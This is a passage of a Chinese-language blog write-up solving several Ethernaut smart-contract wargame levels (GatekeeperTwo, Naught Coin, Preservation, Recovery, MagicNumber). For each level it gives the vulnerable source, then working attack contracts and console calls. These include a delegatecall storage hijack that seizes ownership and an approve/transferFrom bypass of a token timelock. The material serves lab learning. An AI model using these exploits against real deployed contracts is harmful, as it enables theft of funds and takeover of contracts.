<p>7.1. Subtleties. Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code[5].<br>[5] During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code (as defined in H.2).</p>
</blockquote>
<p>所以只要在构造函数中调用即可</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperTwoInterface &#123;</span><br><span class="line">  function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line"></span><br><span class="line">  GatekeeperTwoInterface gatekeeper;</span><br><span class="line"></span><br><span class="line">  constructor(address GatekeeperTwoContractAddress) public &#123;</span><br><span class="line">    gatekeeper = GatekeeperTwoInterface(GatekeeperTwoContractAddress);</span><br><span class="line">    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));</span><br><span class="line">    gatekeeper.enter&#123;gas:50000&#125;(key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
<p> Things that might help</p>
<ul>
<li>The <a target="_blank" rel="noopener" href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> Spec</li>
<li>The <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin</a> codebase</li>
</ul>
<h3 id="Sources-14"><a href="#Sources-14" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="Solution-14"><a href="#Solution-14" class="headerlink" title="Solution"></a>Solution</h3><p>需要清空自己的<code>balance</code>，但限制了时间，查看父合约<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20.sol</a></p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211212201420739.png" class="" title="image-20211212201420739">

<p><code>transferFrom</code>方法也可转账，不过需要先调用<code>approve</code>函数给转账者额度，这里转账者也设为自己</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">contract.approve(player,toWei(&quot;1000000&quot;))</span><br><span class="line">contract.transferFrom(player,ethernaut.address,toWei(&quot;1000000&quot;))</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211212210751357.png" class="" title="image-20211212210751357">

<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p> Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>
<li>Understanding what it means for <code>delegatecall</code> to be context-preserving.</li>
<li>Understanding how storage variables are stored and accessed.</li>
<li>Understanding how casting works between different data types.</li>
</ul>
<h3 id="Sources-15"><a href="#Sources-15" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-15"><a href="#Solution-15" class="headerlink" title="Solution"></a>Solution</h3><p>参考<a href="#Solution-5">Delegation</a>题目，使用<code>delegatecall</code>，状态变量的修改影响的是调用者。所以我们调用<code>Preservation</code>合约的<code>setFirstTime</code>或者<code>setSecondTime</code>方法时，实际修改的是<code>Preservation</code>合约的<code>timeZone1Library</code>变量</p>
<p>部署以下合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack &#123;</span><br><span class="line"></span><br><span class="line">  address slot0;</span><br><span class="line">  address slot1; </span><br><span class="line">  address ownerSlot;</span><br><span class="line"></span><br><span class="line">  function setTime(uint addressAsUint) public &#123;</span><br><span class="line">    // Sets the owner</span><br><span class="line">    ownerSlot = address(addressAsUint);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>Preservation</code>合约<code>setFirstTime</code>或者<code>setSecondTime</code>方法将<code>timeZone1Library</code>设置为恶意合约的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.setSecondTime(&quot;0x382dc9A1Ce05643c327729F18486A0CD656025BE&quot;)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211214232324430.png" class="" title="image-20211214232324430">

<p>再次调用<code>setFirstTime</code>就是执行的恶意合约中的代码了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.setFirstTime(player)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211214232817322.png" class="" title="image-20211214232817322">



<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.5</code> ether to obtain more tokens. They have since lost the contract address.</p>
<p>This level will be completed if you can recover (or remove) the <code>0.5</code> ether from the lost contract address.</p>
<h3 id="Sources-16"><a href="#Sources-16" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-16"><a href="#Solution-16" class="headerlink" title="Solution"></a>Solution</h3><img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215213643538.png" class="" title="image-20211215213643538">

<p>从题目实例拿到的是<code>Recovery</code>合约的地址，需要找到其创建的<code>SimpleToken</code>合约地址，转出其中的0.5 Ether</p>
<p>从交易信息就可以找回地址</p>
<p><a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/address/0xf66c40756e06E352304b5FC9D316669175D518ED#internaltx">https://rinkeby.etherscan.io/address/0xf66c40756e06E352304b5FC9D316669175D518ED#internaltx</a></p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215213925467.png" class="" title="image-20211215213925467">

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215214403004.png" class="" title="image-20211215214403004">

<p>其实从<code>RecoveryFactory.sol</code>代码也可以看出来，创建的合约地址是可预测的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), recoveryInstance, uint8(0x01))))));</span><br></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="https://learnblockchain.cn/2019/06/10/address-compute/">以太坊合约地址是怎么计算出来的？</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3">Ethernaut Lvl 18 Recovery Walkthrough: How to retrieve lost contract addresses (in 2 ways)</a></p>
<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><p>Difficulty 6&#x2F;10</p>
<p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.</p>
<p>Easy right? Well… there’s a catch.</p>
<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.</p>
<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>
<p>Good luck!</p>
<h3 id="Sources-17"><a href="#Sources-17" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-17"><a href="#Solution-17" class="headerlink" title="Solution"></a>Solution</h3><p>题意是构造如下的一个合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNumBadSolver &#123;</span><br><span class="line">    </span><br><span class="line">  function whatIsTheMeaningOfLife() public pure returns (bytes32) &#123;</span><br><span class="line">    return bytes4(int32(42));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNumSolver &#123;</span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    assembly &#123;</span><br><span class="line"></span><br><span class="line">      // This is the bytecode we want the program to have:</span><br><span class="line">      // 00 PUSH1 2a /* push dec 42 (hex 0x2a) onto the stack */</span><br><span class="line">      // 03 PUSH1  0 /* store 42 at memory position 0 */</span><br><span class="line">      // 05 MSTORE</span><br><span class="line">      // 06 PUSH1 20 /* return 32 bytes in memory */</span><br><span class="line">      // 08 PUSH1 0</span><br><span class="line">      // 10 RETURN</span><br><span class="line">      // Bytecode: 0x604260005260206000f3 (length 0x0a or 10)</span><br><span class="line">      // Bytecode within a 32 byte word:</span><br><span class="line">      // 0x00000000000000000000000000000000000000000000604260005260206000f3 (length 0x20 or 32)</span><br><span class="line">      //                                               ^ (offset 0x16 or 22)</span><br><span class="line">      </span><br><span class="line">      mstore(0, 0x602a60005260206000f3)</span><br><span class="line">      return(0x16, 0x0a)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://hitcxy.com/2019/ethernaut/">Ethernaut – Smart Contract</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/9771230.html">ethernaut 以太坊靶场学习 （1-12）</a></p>
<p><a target="_blank" rel="noopener" href="http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/">以太坊智能合约安全入门了解一下（上）</a></p>
<p><a target="_blank" rel="noopener" href="http://rickgray.me/2018/05/26/ethereum-smart-contracts-vulnerabilities-review-part2">以太坊智能合约安全入门了解一下（下）</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" rel="tag"># 智能合约</a>
              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag"># 区块链</a>
              <a href="/tags/Solidity/" rel="tag"># Solidity</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/09/04/DDCTF-2020-WEB-WriteUp/" rel="prev" title="DDCTF 2020 WEB WriteUp">
                  <i class="fa fa-angle-left"></i> DDCTF 2020 WEB WriteUp
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="CodeQL学习笔记">
                  CodeQL学习笔记 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">淚笑</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">78k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">4:43</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
